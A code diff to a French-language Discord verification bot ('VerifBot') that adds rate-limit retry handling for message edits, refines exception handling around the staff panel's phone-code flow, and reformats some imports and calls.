@@ -9,7 +9,16 @@ import logging
 from typing import Optional, Dict, Set
 from aiohttp import web
 import config
-from utils import validate_phone, validate_code, mask_phone, load_blacklist, save_blacklist, is_user_blacklisted, is_phone_blacklisted, add_to_blacklist
+from utils import (
+    validate_phone,
+    validate_code,
+    mask_phone,
+    load_blacklist,
+    save_blacklist,
+    is_user_blacklisted,
+    is_phone_blacklisted,
+    add_to_blacklist
+)
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
 log = logging.getLogger("VerifBot")
@@ -131,6 +140,25 @@ async def safe_respond(interaction: discord.Interaction, embed: discord.Embed, e
             await interaction.response.send_message(embed=embed, ephemeral=ephemeral)
     except Exception:
         log.exception("safe_respond failed")
+
+async def safe_edit_message(message: discord.Message, embed: discord.Embed, view=None):
+    try:
+        await message.edit(embed=embed, view=view)
+    except discord.errors.HTTPException as e:
+        if e.status == 429:
+            retry_after = getattr(e, "retry_after", 2.0)
+            log.warning(f"Rate limit on message edit. Retrying in {retry_after}s")
+            await asyncio.sleep(retry_after)
+            try:
+                await message.edit(embed=embed, view=view)
+            except Exception:
+                log.exception("safe_edit_message retry failed")
+        else:
+            raise
+    except discord.NotFound:
+        log.warning("Message not found during edit")
+    except Exception:
+        log.exception("safe_edit_message failed")
 
 async def send_log(title: str, description: str = "", color: int = COLOR_BLUE, fields: list = None, user: discord.User = None, ping: int = 0):
     channel = get_log_channel()
@@ -501,12 +529,19 @@ class CodeSendModal(discord.ui.Modal, title="Envoyer le code"):
                 except Exception:
                     pass
 
-            try:
-                if v.message is not None:
+            await asyncio.sleep(0.5)
+
+            if v.message is not None:
+                try:
                     user_fetch = await bot.fetch_user(v.user_id)
                     await v.refresh(v.message, user_fetch, "Code envoyé", "En attente de saisie")
-            except Exception:
-                log.exception("Erreur refresh du panneau staff après envoi du code")
+                except discord.errors.HTTPException as e:
+                    if e.status == 429:
+                        log.warning("Rate limit hit while refreshing staff panel. Skipping this refresh.")
+                    else:
+                        log.exception("Erreur refresh panel staff")
+                except Exception:
+                    log.exception("Erreur refresh panel staff")
 
             asyncio.create_task(send_log(
                 title="Code envoyé",
@@ -660,9 +695,19 @@ class StaffPanelView(discord.ui.View):
         try:
             if message is None:
                 return
-            new_embed = build_staff_embed(user=user, phone=self.phone, status=status, claimed_by=self.claimed_by, code_status=code_status, timestamp=self.created_at)
+
+            new_embed = build_staff_embed(
+                user=user,
+                phone=self.phone,
+                status=status,
+                claimed_by=self.claimed_by,
+                code_status=code_status,
+                timestamp=self.created_at
+            )
+
             if color:
                 new_embed.color = color
+
             for child in self.children:
                 if isinstance(child, discord.ui.Button):
                     if self.locked:
@@ -671,7 +716,8 @@ class StaffPanelView(discord.ui.View):
                         child.disabled = True
                         child.style = discord.ButtonStyle.secondary
                         child.label = "Pris en charge"
-            await message.edit(embed=new_embed, view=self)
+
+            await safe_edit_message(message, new_embed, view=self)
         except discord.NotFound:
             log.warning("Staff panel message deleted during refresh")
         except Exception:
@@ -772,6 +818,7 @@ class StaffPanelView(discord.ui.View):
                     color=COLOR_GOLD
                 ))
                 return
+
             await interaction.response.send_modal(CodeSendModal(self))
         except discord.errors.NotFound:
             log.warning("Send code interaction not found")
